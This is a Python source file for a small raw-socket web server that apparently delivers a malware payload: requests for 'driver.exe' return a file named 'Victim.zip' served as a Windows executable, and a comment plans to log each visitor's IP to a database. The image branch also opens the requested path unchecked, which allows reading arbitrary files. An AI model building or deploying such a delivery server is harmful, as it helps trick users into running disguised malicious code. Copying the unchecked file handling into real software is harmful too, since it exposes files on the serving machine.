import socket

HTML_FILE = ".\HTML_file.html"
CLIENT_EXE = ".\..\Release\Victim.zip"
HTTP_URL = "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8 \nContent-Length: 0\n Connection: close\n\n"


class Server: 

    # opens the listening port on the ip and port provided

    def __init__(self, ip, port):
        self.listen = socket.socket()
        self.listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listen.bind((ip, port))
        self.listen.listen(1)
        self.client = None

    # accepts the client and recieves their GET request

    def accept(self):
        self.client, address = self.listen.accept()
        print(address, " connected") # later this will add the computer's ip to a data base
        get = self.client.recv(1024).decode()
        slash = get.split('/')
        try: # if for some reason the request has failed i return the html page
            data = slash[1].split("HTTP")
        except Exception as e:
            print(e)
            return ""
        return data[0]

    # I send the response back

    def answer(self, data): 
        self.client.send(get_response(data)) #send the file to the client
        self.client.close() #close the socket


# the fuction gets the data and creates the apropreate response by type of file: exe html or pictures like png jpg etc

def get_response(data):
    file_data = b""
    print(data)
    if "driver.exe" in data:
        with open(CLIENT_EXE, 'rb') as file:
            file_data += file.read()
        size = len(file_data)
        res = f"HTTP/1.1 200 OK\nContent-Type: application/vnd.microsoft.portable-executable; charset=utf-8 " \
              f"\nContent-Length: {size}\nConnection: close\n\n".encode()
        res += file_data
    elif "jpg" in data or "png" in data:
        with open(f"./{data}", 'rb') as file:
            file_data += file.read()
        size = len(file_data)
        res = f"HTTP/1.1 200 OK\nContent-Type: Image/xyz; charset=utf-8 \nContent-Length: {size}\n Connection: close\n\n".encode()
        res += file_data
    else:
        with open(HTML_FILE, 'rb') as file:
            file_data += file.read()
        size = len(file_data)
        res = f"HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8 \nContent-Length: {size}\n Connection: close\n\n".encode()
        res += file_data
    return res


def main():
    listen = Server("0.0.0.0", 80)  # the ip and port of the server are chosen here
    while True:
        GET = listen.accept()  # returns the get request of the connected device
        if not GET:
            continue
        listen.answer(GET)


if __name__ == '__main__':
    main()
